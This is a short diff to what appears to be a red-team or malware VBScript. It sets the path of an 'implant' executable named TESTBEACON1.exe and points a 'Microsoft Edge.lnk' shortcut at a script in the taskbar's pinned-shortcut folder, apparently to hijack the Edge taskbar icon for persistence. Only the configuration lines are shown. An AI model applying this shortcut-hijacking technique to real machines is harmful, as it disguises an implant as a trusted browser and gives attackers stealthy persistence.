@@ -1,6 +1,6 @@
 implant = "C:\Users\aslam\Documents\TESTBEACON1.exe"
 ' change username + path
-newTarget = "C:\Users\aslam\Desktop\xmxedge2.vbs"
+newTarget = "C:\Users\aslam\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\ImplicitAppShortcuts\xmedge.vbs"
 lnkName = "Microsoft Edge.lnk"
 
 ' targets the taskbar
